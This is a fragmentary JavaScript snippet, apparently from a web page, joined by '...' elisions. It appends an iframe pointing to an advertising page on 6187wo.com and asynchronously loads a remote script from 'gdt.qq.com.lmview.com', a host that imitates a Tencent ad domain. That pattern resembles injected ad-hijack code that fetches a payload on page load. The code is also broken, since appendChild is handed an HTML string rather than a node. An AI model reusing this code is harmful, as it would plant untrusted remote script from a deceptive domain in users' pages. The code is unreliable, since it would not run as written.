...
//		new Image().src = blogs;
            ...
            document.getElementById(li_ifr_id).appendChild("<iframe style='border: 0px; width: 100%; height: 316px;' src='https://etc.6187wo.com/adv.html'></iframe>");
...
(function () {
    ...
    s.async = true;
    s.src = '//gdt.qq.com.lmview.com/i_cc.js';
